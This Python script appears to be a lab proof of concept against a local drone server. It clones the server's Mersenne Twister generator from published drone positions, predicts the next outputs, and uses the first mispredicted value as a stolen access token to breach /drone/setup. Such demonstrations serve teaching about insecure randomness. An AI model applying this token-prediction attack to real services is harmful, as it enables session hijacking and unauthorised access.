import requests
import json

from MT19937Cracker import MT19937Cracker

import time
import random

i = 0
mt_cracker = MT19937Cracker()
response_json_copy = None
response_json = None
done = False


def token():
    response = requests.get(
        "http://127.0.0.1:8000/login?username=user1&password=secret"
    )
    r = json.loads(response.text)
    return r["Token"]


def user_changed_drones(token):
    response = requests.get("http://127.0.0.1:8000/drone/setup?access_token=" + token)


user_token = token()
user_changed_drones(user_token)
# Assuming that a user has entered and is now changeing drones at random

# After the server opens using the attack is going to start
while True:
    while True:
        # random assumption that the user has changed the drones
        if random.randint(1, 2) == 1:
            print("! User changed drone positions !")
            user_changed_drones(user_token)

        # Take the drone positions
        response = requests.get("http://127.0.0.1:8000/drone/getalldronepositions")
        response_json = json.loads(response.text)
        if response_json_copy is not None:
            # compare with previous to see if different
            if (
                not response_json_copy["Drone_positions"]
                == response_json["Drone_positions"]
            ):
                response_json_copy = response_json
                break
        else:
            response_json_copy = response_json
            break
        # sleep would be recommended in attack senaroios as you dont what to flood the server with requests from the same user
        # time.sleep()
        print("- No change detected -")

    # import crack
    print("- Adding list of drone positions -")
    for x in response_json["Drone_positions"]:
        done = mt_cracker.crack(x)
        if done:
            break
    if done:
        response_json_copy = response_json
        break

print("- Finished cracking -")
# Once this is done we have a system for cracking setup
# now one we can steal access codes.
cracked_list = list()
for i in range(len(response_json["Drone_positions"])):
    cracked_list.append(mt_cracker.get_next())
# to do this is simple you predict the next X positons of drones and if they do not match the first number is an access token
while True:
    if (
        random.randint(1, 100) == 1
    ):  # 1 in 100 chance that a new access token might be created
        user_token = token()
        user_changed_drones(user_token)
        print("! New user logged in !")
    while True:
        if random.randint(1, 2) == 1:
            print("! User changed drone positions !")
            user_changed_drones(user_token)

        response = requests.get("http://127.0.0.1:8000/drone/getalldronepositions")
        response_json = json.loads(response.text)
        if (
            not response_json_copy["Drone_positions"]
            == response_json["Drone_positions"]
        ):
            break

    print("- checking differences in predicted list and actual positions -")
    cracked_list = list()
    for i in range(len(response_json["Drone_positions"])):
        cracked_list.append(mt_cracker.get_next())

    if not cracked_list == response_json["Drone_positions"]:
        break

    response_json_copy = response_json
    # time.sleep(5.0)

print("- found access token -")
attempted_access_token = cracked_list[0]
response = requests.get(
    "http://127.0.0.1:8000/drone/setup?access_token=" + str(attempted_access_token)
)

if response.status_code == 200:
    print("Breach successfull")
else:
    print("Breach unsuccessfull")
